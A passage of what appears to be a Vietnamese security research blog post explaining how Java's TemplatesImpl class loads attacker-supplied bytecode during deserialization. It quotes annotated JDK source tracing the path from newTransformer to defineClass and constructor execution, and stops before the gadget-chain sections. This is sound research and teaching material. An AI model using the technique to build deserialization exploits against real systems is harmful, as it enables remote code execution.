<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Java Deserialization p1 - TemplateImpl class and its utilization chain | devme4f blogs</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/java-deserialization-p1/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Java Deserialization p1 - TemplateImpl class and its utilization chain" />
<meta property="og:description" content="Preface com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl là một class nằm trong thư viện Apache Xalan có sẵn trong java runtime nhằm phục vụ quá trình transform XML document, tuy nhiên lại bị lợi dụng rất nhiều trong các bộ deserialization gadget chain do có thể thực hiện load bytecode dẫn đến thực thi command tùy ý. Bài viết sẽ phân tích chi tiết class TemplateImpl và một vài chain phổ biến sử dụng sink là TemplateImpl như bộ CommonsBeanutils hay CommonsCollections 2, 3, 4." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2023/java-deserialization-p1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-12T23:46:31+07:00" />
<meta property="article:modified_time" content="2023-09-12T23:46:31+07:00" />

  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Java Deserialization p1 - TemplateImpl class and its utilization chain"/>
<meta name="twitter:description" content="Preface com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl là một class nằm trong thư viện Apache Xalan có sẵn trong java runtime nhằm phục vụ quá trình transform XML document, tuy nhiên lại bị lợi dụng rất nhiều trong các bộ deserialization gadget chain do có thể thực hiện load bytecode dẫn đến thực thi command tùy ý. Bài viết sẽ phân tích chi tiết class TemplateImpl và một vài chain phổ biến sử dụng sink là TemplateImpl như bộ CommonsBeanutils hay CommonsCollections 2, 3, 4."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/posts/2023/sekaictf-2023_frog-waf/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/posts/2023/quick-note-spring-memshell/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&text=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&title=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&is_video=false&description=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&title=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&title=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&name=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain&description=Preface%20com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl%20l%c3%a0%20m%e1%bb%99t%20class%20n%e1%ba%b1m%20trong%20th%c6%b0%20vi%e1%bb%87n%20Apache%20Xalan%20c%c3%b3%20s%e1%ba%b5n%20trong%20java%20runtime%20nh%e1%ba%b1m%20ph%e1%bb%a5c%20v%e1%bb%a5%20qu%c3%a1%20tr%c3%acnh%20transform%20XML%20document%2c%20tuy%20nhi%c3%aan%20l%e1%ba%a1i%20b%e1%bb%8b%20l%e1%bb%a3i%20d%e1%bb%a5ng%20r%e1%ba%a5t%20nhi%e1%bb%81u%20trong%20c%c3%a1c%20b%e1%bb%99%20deserialization%20gadget%20chain%20do%20c%c3%b3%20th%e1%bb%83%20th%e1%bb%b1c%20hi%e1%bb%87n%20load%20bytecode%20d%e1%ba%abn%20%c4%91%e1%ba%bfn%20th%e1%bb%b1c%20thi%20command%20t%c3%b9y%20%c3%bd.%20B%c3%a0i%20vi%e1%ba%bft%20s%e1%ba%bd%20ph%c3%a2n%20t%c3%adch%20chi%20ti%e1%ba%bft%20class%20TemplateImpl%20v%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20chain%20ph%e1%bb%95%20bi%e1%ba%bfn%20s%e1%bb%ad%20d%e1%bb%a5ng%20sink%20l%c3%a0%20TemplateImpl%20nh%c6%b0%20b%e1%bb%99%20CommonsBeanutils%20hay%20CommonsCollections%202%2c%203%2c%204." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&t=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#load-bytecode">Load bytecode</a>
      <ul>
        <li><a href="#use-classloaderdefineclass-to-load-bytecode-directly">Use ClassLoader#defineClass to load bytecode directly</a></li>
        <li><a href="#load-bytecode-using-templatesimpl">Load bytecode using TemplatesImpl</a></li>
      </ul>
    </li>
    <li><a href="#utilization-chain">Utilization chain</a>
      <ul>
        <li><a href="#commonsbeanutils1">CommonsBeanutils1</a></li>
        <li><a href="#commonscollections2">CommonsCollections2</a></li>
        <li><a href="#commonscollections4">CommonsCollections4</a></li>
        <li><a href="#commonscollections3">CommonsCollections3</a></li>
      </ul>
    </li>
    <li><a href="#thoughs">Thoughs</a></li>
    <li><a href="#refs">refs</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Java Deserialization p1 - TemplateImpl class and its utilization chain
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2023-09-12 23:46:31 &#43;0700 &#43;07" itemprop="datePublished">2023-09-12</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/research" rel="tag">research</a>
            
             ,  
            <a class="tag-link" href="/tags/deser" rel="tag">deser</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <h2 id="preface">Preface</h2>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl</code> là một class nằm trong thư viện Apache Xalan có sẵn trong java runtime nhằm phục vụ quá trình transform XML document, tuy nhiên lại bị lợi dụng rất nhiều trong các bộ deserialization gadget chain do có thể thực hiện load bytecode dẫn đến thực thi command tùy ý. Bài viết sẽ phân tích chi tiết class <code>TemplateImpl</code> và một vài chain phổ biến sử dụng sink là <code>TemplateImpl</code> như bộ CommonsBeanutils hay CommonsCollections 2, 3, 4.</p>
<h2 id="load-bytecode">Load bytecode</h2>
<p>Trước khi tìm hiểu class <code>TemplateImpl</code>, cùng đi qua method <code>ClassLoader#defineClass</code> để hiểu cơ chế load bytecode trong java.</p>
<h3 id="use-classloaderdefineclass-to-load-bytecode-directly">Use ClassLoader#defineClass to load bytecode directly</h3>
<p><code>defineClass</code> thật ra là một java native method được viết bằng C giúp chuyển đổi byte stream thành một java class hoàn chỉnh trong runtime. Tuy nhiên method <code>defineClass</code> có thuộc tính <code>protected</code> nên phải tạo một subclass kế thừa nó hoặc dùng đến reflection mới có thể sử dụng trực tiếp:
<img src="/images/2023/Java-deserialization-p1/defineClass.png" alt="defineClass"></p>
<p>Ví dụ, tạo một class <code>Hello</code> với default constructor in thông báo hello:
<img src="/images/2023/Java-deserialization-p1/Hello.png" alt="Hello"></p>
<p>Compile class này sau đó thử load bytecode bằng cách dùng reflection:
<img src="/images/2023/Java-deserialization-p1/Compile.png" alt="Compile">
<em>Thông báo đã được in</em></p>
<p><strong>Chú ý</strong>: Khi <code>defineClass</code> được gọi, class object sẽ không được khởi tạo mà chỉ khi ta tự gọi đến constructor của nó ( ở đây là <code>newInstance()</code> ). Kể cả khi ta đặt initialization code trong static block của class thì vẫn không được thực thi khi definingClass. Vậy nên nếu muốn dùng <code>defineClass</code> để thực thi mã bất kì khi load bytecode ==&gt; phải tìm cách gọi được constructor.</p>
<h3 id="load-bytecode-using-templatesimpl">Load bytecode using TemplatesImpl</h3>
<p>Như đã trình bày, do <code>ClassLoader#defineClass</code> không thể truy cập trực tiếp nên trong thực tế khó có thể sử dụng trong exploit chain, tuy nhiên ta có thể sử dụng một attack chain đã rất phổ biến là <code>TemplateImpl</code> để load bytecode, tổng quan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>TemplatesImpl.<span style="color:#a6e22e">newTransformer</span>()
</span></span><span style="display:flex;"><span>	TemplatesImpl.<span style="color:#a6e22e">getTransletInstance</span>()
</span></span><span style="display:flex;"><span>		TemplatesImpl.<span style="color:#a6e22e">defineTransletClasses</span>()
</span></span><span style="display:flex;"><span>			TransletClassLoader.<span style="color:#a6e22e">defineClass</span>()
</span></span></code></pre></div><p>Trong <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> có inner class <code>TransletClassLoader</code> override method <code>defineClass</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TransletClassLoader</span> <span style="color:#66d9ef">extends</span> ClassLoader {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String,Class<span style="color:#f92672">&gt;</span> _loadedExternalExtensionFunctions;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     TransletClassLoader(ClassLoader parent) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">super</span>(parent);
</span></span><span style="display:flex;"><span>        _loadedExternalExtensionFunctions <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TransletClassLoader(ClassLoader parent,Map<span style="color:#f92672">&lt;</span>String, Class<span style="color:#f92672">&gt;</span> mapEF) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>(parent);
</span></span><span style="display:flex;"><span>        _loadedExternalExtensionFunctions <span style="color:#f92672">=</span> mapEF;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Class<span style="color:#f92672">&lt;?&gt;</span> loadClass(String name) <span style="color:#66d9ef">throws</span> ClassNotFoundException {
</span></span><span style="display:flex;"><span>        Class<span style="color:#f92672">&lt;?&gt;</span> ret <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// The _loadedExternalExtensionFunctions will be empty when the</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// SecurityManager is not set and the FSP is turned off</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_loadedExternalExtensionFunctions <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> _loadedExternalExtensionFunctions.<span style="color:#a6e22e">get</span>(name);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">loadClass</span>(name);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ret;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Access to final protected superclass member from outer class.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
</span></span><span style="display:flex;"><span>    Class <span style="color:#a6e22e">defineClass</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> b) { <span style="color:#75715e">// NOTE: overridden</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> defineClass(<span style="color:#66d9ef">null</span>, b, 0, b.<span style="color:#a6e22e">length</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Do class này không khai báo scope, scope sẽ là &ldquo;default&rdquo; ==&gt; Outer class <code>TemplatesImpl</code> có thể truy cập inner class <code>TransletClassLoader</code> member.</p>
<p><code>TemplatesImpl#defineTransletClasses()</code> là method gọi <code>TransletClassLoader#defineClass()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">defineTransletClasses</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throws</span> TransformerConfigurationException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (_bytecodes <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">NO_TRANSLET_CLASS_ERR</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TransletClassLoader loader <span style="color:#f92672">=</span> (TransletClassLoader)
</span></span><span style="display:flex;"><span>        AccessController.<span style="color:#a6e22e">doPrivileged</span>(<span style="color:#66d9ef">new</span> PrivilegedAction() {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">run</span>() {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> TransletClassLoader(ObjectFactory.<span style="color:#a6e22e">findClassLoader</span>(),_tfactory.<span style="color:#a6e22e">getExternalExtensionsMap</span>()); <span style="color:#75715e">// NOTE: gọi TransformerFactoryImpl#getExternalExtensionsMap()</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> classCount <span style="color:#f92672">=</span> _bytecodes.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>        _class <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>classCount<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (classCount <span style="color:#f92672">&gt;</span> 1) {
</span></span><span style="display:flex;"><span>            _auxClasses <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> classCount; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> loader.<span style="color:#a6e22e">defineClass</span>(_bytecodes<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>); <span style="color:#75715e">// NOTE: defineClass load bytecode</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> Class superClass <span style="color:#f92672">=</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getSuperclass</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Check if this is the main class</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (superClass.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(ABSTRACT_TRANSLET)) { <span style="color:#75715e">// NOTE: check superclass</span>
</span></span><span style="display:flex;"><span>                _transletIndex <span style="color:#f92672">=</span> i;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                _auxClasses.<span style="color:#a6e22e">put</span>(_class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getName</span>(), _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_transletIndex <span style="color:#f92672">&lt;</span> 0) {
</span></span><span style="display:flex;"><span>            ErrorMsg err<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR</span>, _name);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (ClassFormatError e) {
</span></span><span style="display:flex;"><span>        ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_CLASS_ERR</span>, _name);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (LinkageError e) {
</span></span><span style="display:flex;"><span>        ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tuy nhiên vẫn là <code>private</code>, không thể gọi trực tiếp. Để ý tại đây sau khi defineClass, class được load phải có superclass là <code>AbstractTranslet</code>. Tiếp đến <code>TemplatesImpl#getTransletInstance</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> Translet <span style="color:#a6e22e">getTransletInstance</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throws</span> TransformerConfigurationException {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_class <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) defineTransletClasses(); <span style="color:#75715e">// NOTE: gọi </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// The translet needs to keep a reference to all its auxiliary</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// class to prevent the GC from collecting them</span>
</span></span><span style="display:flex;"><span>        AbstractTranslet translet <span style="color:#f92672">=</span> (AbstractTranslet) _class<span style="color:#f92672">[</span>_transletIndex<span style="color:#f92672">]</span>.<span style="color:#a6e22e">newInstance</span>(); <span style="color:#75715e">// ===&gt; NOTE: gọi constructor khởi tạo object</span>
</span></span><span style="display:flex;"><span>        translet.<span style="color:#a6e22e">postInitialization</span>();
</span></span><span style="display:flex;"><span>        translet.<span style="color:#a6e22e">setTemplates</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        translet.<span style="color:#a6e22e">setOverrideDefaultParser</span>(_overrideDefaultParser);
</span></span><span style="display:flex;"><span>        translet.<span style="color:#a6e22e">setAllowedProtocols</span>(_accessExternalStylesheet);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_auxClasses <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            translet.<span style="color:#a6e22e">setAuxiliaryClasses</span>(_auxClasses);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translet;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (InstantiationException e) {
</span></span><span style="display:flex;"><span>        ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (IllegalAccessException e) {
</span></span><span style="display:flex;"><span>        ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Vẫn <code>private</code>, để ý line <em>10</em> khởi tạo object gọi <code>.newInstance()</code> sau khi <code>defineClass</code> &ndash;&gt; gọi constructor khởi tạo object.</p>
<p>Cuối cùng <code>newTransformer()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> Transformer <span style="color:#a6e22e">newTransformer</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throws</span> TransformerConfigurationException
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    TransformerImpl transformer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformerImpl(getTransletInstance(), _outputProperties,
</span></span><span style="display:flex;"><span>        _indentNumber, _tfactory); <span style="color:#75715e">// NOTE: gọi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (_uriResolver <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        transformer.<span style="color:#a6e22e">setURIResolver</span>(_uriResolver);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (_tfactory.<span style="color:#a6e22e">getFeature</span>(XMLConstants.<span style="color:#a6e22e">FEATURE_SECURE_PROCESSING</span>)) {
</span></span><span style="display:flex;"><span>        transformer.<span style="color:#a6e22e">setSecureProcessing</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
